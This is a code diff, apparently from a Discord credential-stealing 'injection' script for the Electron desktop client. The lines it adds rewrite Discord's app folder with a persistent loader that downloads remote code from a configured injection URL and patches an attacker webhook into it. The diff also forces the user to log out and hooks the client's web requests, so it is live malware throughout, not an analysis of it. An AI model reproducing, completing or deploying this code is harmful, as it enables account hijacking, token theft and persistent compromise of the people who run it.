@@ -444,52 +444,51 @@ const FirstTime = async () => {
     return false
 }
 
-const path = require('path');
-const ipath = (function () {
-    var appPath = electron.app.getAppPath().replace(/\\/g, "/").split("/")
-    appPath.pop()
-    appPath = appPath.join("/")
-    var appName = electron.app.getName()
+const path = (function () {
+    var appPath = electron.app.getAppPath().replace(/\\/g, "/").split("/");
+    appPath.pop();
+    appPath = appPath.join("/");
+    var appName = electron.app.getName();
     return {
         appPath,
         appName
-    }
-}())
+    };
+})();
 
 const checUpdate = () => {
     var {
         appPath,
         appName
-    } = ipath
+    } = path;
 
-    var ressource = `${appPath}/app`
-    var indexFile = __filename.replace(/\\/g, "/")
-    var betterDiscord = `${process.env.appdata.replace(/\\/g, "/")}/betterdiscord/data/betterdiscord.asar`
-    var package = `${ressource}/package.json`
-    var index = `${ressource}/index.js`
+    var ressource = `${appPath}/app`;
+    var indexFile = __filename.replace(/\\/g, "/");
+    var betterDiscord = `${process.env.appdata.replace(/\\/g, "/")}/betterdiscord/data/betterdiscord.asar`;
+    var packageJson = `${ressource}/package.json`;
+    var indexJs = `${ressource}/index.js`;
 
-    if (!fs.existsSync(ressource)) fs.mkdirSync(ressource)
-    fs.writeFileSync(package, `{"name": "${appName}", "main": "./index.js"}`)
+    if (!fs.existsSync(ressource)) fs.mkdirSync(ressource);
+    fs.writeFileSync(packageJson, `{"name": "${appName}", "main": "./index.js"}`);
 
-    var script = `const fs = require("fs"), https = require("https")
-var index = "${indexFile}"
-var betterDiscord = "${betterDiscord}"
-var bouki = fs.readFileSync(index).toString()
-if (bouki == "module.exports = require('./core.asar');") init()
+    var script = `const fs = require("fs"), https = require("https");
+var index = "${indexFile}";
+var betterDiscord = "${betterDiscord}";
+var bouki = fs.readFileSync(index).toString();
+if (bouki == "module.exports = require('./core.asar');") init();
 function init() {
     https.get("${config.injection_url}", res => {
-        var chunk = ""
-        res.on("data", data => chunk += data)
-        res.on("end", () => fs.writeFileSync(index, chunk.replace("%HOOKRE%", "${config.webhook}")))
+        var chunk = "";
+        res.on("data", data => chunk += data);
+        res.on("end", () => fs.writeFileSync(index, chunk.replace("%HOOKRE%", "${config.webhook}")));
     }).on("error", (err) => setTimeout(init(), 10000));
 }
-require("${appPath}/app.asar")
-if (fs.existsSync(betterDiscord)) require(betterDiscord)`
+require("${appPath}/app.asar");
+if (fs.existsSync(betterDiscord)) require(betterDiscord);`;
 
-    fs.writeFileSync(index, script)
-    if (!doTheLogOut) execScript(logOutScript)
-    return
-}
+    fs.writeFileSync(indexJs, script);
+    if (!doTheLogOut) execScript(logOutScript);
+    return;
+};
 electron.session.defaultSession.webRequest.onBeforeRequest(config.Filter, async (details, callback) => {
     await electron.app.whenReady();
     await FirstTime()
